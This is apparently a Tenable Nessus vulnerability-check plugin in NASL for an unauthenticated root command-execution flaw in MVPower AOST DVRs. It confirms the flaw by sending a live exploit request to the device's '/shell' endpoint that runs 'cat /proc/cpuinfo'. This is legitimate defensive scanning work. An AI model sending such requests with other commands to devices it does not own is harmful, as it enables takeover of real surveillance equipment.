#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(104144);
  script_version("1.2");
  script_cvs_date("Date: 2018/06/13 18:56:25");


  script_name(english:"MVPower DVR Remote Command Execution");
  script_summary(english:"Sends an HTTP GET request");

  script_set_attribute(attribute:"synopsis", value:
"The remote device is affected by a remote command execution
vulnerability");
  script_set_attribute(attribute:"description", value:
"The remote AOST-based network video recorder distributed by
MVPower is affected by a remote command execution vulnerability.
An unauthenticated remote attacker can use this vulnerability to
execute operating system commands as root.

This vulnerability has been used by the IoT Reaper botnet.");
  script_set_attribute(attribute:"see_also", value:"https://www.pentestpartners.com/security-blog/pwning-cctv-cameras/");
  # http://blog.netlab.360.com/iot_reaper-a-rappid-spreading-new-iot-botnet-en/
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?197042fe");
  script_set_attribute(attribute:"solution", value:
"There is no patch to this vulnerability");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_set_cvss3_base_vector("CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H");

  script_set_attribute(attribute:"vuln_publication_date", value:"2016/02/10");
  script_set_attribute(attribute:"plugin_publication_date", value:"2017/10/25");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2017-2018 Tenable Network Security, Inc.");

  script_dependencies("aost_nvr_detect.nbin");
  script_require_keys("installed_sw/AOST");
  script_require_ports("Services/www", 80, 81, 82, 88, 8080);

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("webapp_func.inc");

appname = 'AOST';
get_install_count(app_name:appname, exit_if_zero:TRUE);
port = get_http_port(default:80, embedded:TRUE);
install = get_single_install(app_name:appname, port:port);

uri = '/shell?cat%20/proc/cpuinfo';
res = http_send_recv3(
  method:'GET',
  item:uri,
  port:port,
  exit_on_fail:TRUE);

if ("200 OK" >!< res[0] || "Processor" >!< res[2] || "BogoMIPS" >!< res[2])
{
  audit(AUDIT_HOST_NOT, "an affected AOST device");
}

security_report_v4(port:port, severity:SECURITY_HOLE, generic:TRUE,
    cmd:"cat /proc/cpuinfo", request:make_list(build_url(qs:uri, port:port)),
    output: res[2]);
